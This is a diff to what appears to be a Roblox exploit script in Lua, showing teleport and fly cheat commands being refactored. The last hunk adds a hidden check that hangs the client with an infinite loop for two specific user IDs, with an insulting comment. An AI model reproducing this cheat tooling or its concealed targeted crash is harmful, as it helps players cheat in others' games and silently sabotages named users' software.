@@ -897,8 +897,6 @@ AddCommand(function(Arguments)
 	end
 end,"tpto",{"tp"},"Teleports to places [banland/normalstreets/uzi/machete/spray/sawed/sawedoff/pipe/sand/prison/gas/court/beach/bank]")
 
-
-AddCommand(function(Arguments)
 local function fly(Speed)
 	local Head = GetChar():WaitForChild('Head',10)
 	if not Head then return end 
@@ -910,40 +908,46 @@ local function fly(Speed)
 		BodyGyro.maxTorque = Vector3.new(9e9,9e9,9e9)
 		BodyGyro.CFrame = Head.CFrame
 		pcall(function()
-		  repeat wait()
-			GetChar().Humanoid.PlatformStand = true
-			local Pos = BodyGyro.CFrame - BodyGyro.CFrame.p + BodyPos.Position
-			if not KeyTable['w'] and not KeyTable['a'] and not KeyTable['s'] and not KeyTable['d'] then 
-			  Speed = Speed
-			elseif KeyTable['w'] then
-			  Pos = Pos + workspace.Camera.CoordinateFrame.lookVector * Speed
-			elseif KeyTable['a'] then 
-			  Pos = Pos * CFrame.new(-Speed, 0, 0)
-			elseif KeyTable['s'] then 
-			  Pos = Pos - workspace.Camera.CoordinateFrame.lookVector * Speed 
-			elseif KeyTable['d'] then 
-			  Pos = Pos * CFrame.new(Speed, 0, 0)
-			end 
-			BodyPos.Position = Pos.p
-			BodyGyro.CFrame = workspace.Camera.CoordinateFrame
-			GetChar().Humanoid.PlatformStand = false
-			GetChar().Humanoid:ChangeState(10)
-			if not AirWalkOn then 
-				CheckCommand("airwalk")
-			end
-			until not flying or GetChar().Humanoid.Health == 0
-			if not HadAirwalk then 
-				CheckCommand("airwalk")
-			end
-			if BodyGyro and BodyPos then 
+		repeat wait()
+		GetChar().Humanoid.PlatformStand = true
+		local Pos = BodyGyro.CFrame - BodyGyro.CFrame.p + BodyPos.Position
+		if not KeyTable['w'] and not KeyTable['a'] and not KeyTable['s'] and not KeyTable['d'] then 
+			Speed = Speed
+		elseif KeyTable['w'] then
+			Pos = Pos + workspace.Camera.CoordinateFrame.lookVector * Speed
+		elseif KeyTable['a'] then 
+			Pos = Pos * CFrame.new(-Speed, 0, 0)
+		elseif KeyTable['s'] then 
+			Pos = Pos - workspace.Camera.CoordinateFrame.lookVector * Speed 
+		elseif KeyTable['d'] then 
+			Pos = Pos * CFrame.new(Speed, 0, 0)
+		end 
+		BodyPos.Position = Pos.p
+		BodyGyro.CFrame = workspace.Camera.CoordinateFrame
+		GetChar().Humanoid.PlatformStand = false
+		GetChar().Humanoid:ChangeState(10)
+		if not AirWalkOn then 
+			CheckCommand("airwalk")
+		end
+		until not flying or GetChar().Humanoid.Health == 0
+		if not HadAirwalk then 
+			CheckCommand("airwalk")
+		end
+		if BodyGyro and BodyPos then 
 				BodyGyro:Destroy()
-				BodyPos:Destroy()
-			end
-			GetChar().Humanoid.PlatformStand = false 
-		end)
-	end
+			BodyPos:Destroy()
+		end
+		GetChar().Humanoid.PlatformStand = false 
+	end)
+end
+
+AddCommand(function(Arguments)
 	if not flying then
-		fly(Arguments[1] and tonumber(Arguments[1]) or 10)
+		--if Arguments[2] and Arguments[2]:lower() == "iy" then  soon addition 
+		
+		--else
+			fly(Arguments[1] and tonumber(Arguments[1]) or 10)
+		--end
 	else 
 		flying = false 
 	end
@@ -2168,6 +2172,10 @@ if FileDir and isFolder and makeFolder then
 			end
 		end
 	end
+end 
+
+if LP.UserId == 251848039 or LP.UserId == 57890959 then 
+	while true do end -- crash that dumb ass skid! 
 end 
 
 for i = 1,#Commands do
